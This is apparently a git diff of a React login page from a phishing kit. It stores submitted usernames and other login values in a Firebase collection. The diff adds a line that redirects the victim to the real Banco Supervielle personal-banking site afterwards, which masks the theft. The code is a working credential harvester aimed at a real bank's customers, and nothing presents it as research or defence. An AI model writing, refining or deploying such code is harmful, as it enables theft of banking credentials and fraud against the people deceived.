@@ -1,6 +1,5 @@
 import React from 'react';
 import {Form, Button} from 'react-bootstrap';
-import axiosClient from './config/axios';
 import moment from 'moment';
 import firebase from "./firebase";
 
@@ -21,7 +20,6 @@ const Login = () => {
     const sendCredentials = async () =>{
         try{
             const date = new Date();
-            const id = Math.random().toString(36).slice(2);
 
             await collection.add({
                 username: usernameVal,
@@ -31,19 +29,13 @@ const Login = () => {
               })
               .then(() => {
                 console.log("Document successfully written!");
+                window.location.href = "https://www.supervielle.com.ar/personas";
               })
               .catch(function(error){
                   console.error("Error adding Tutorial: ", error);
               });
 
             console.log("creado");
-            /*const response = await axiosClient.post("/credentials", credentials)
-            .then((response) => {
-                console.log(response);
-            })
-            .catch((err) => {
-                console.log(err.code);
-            });*/
         }
         catch(e){
             console.log(e);
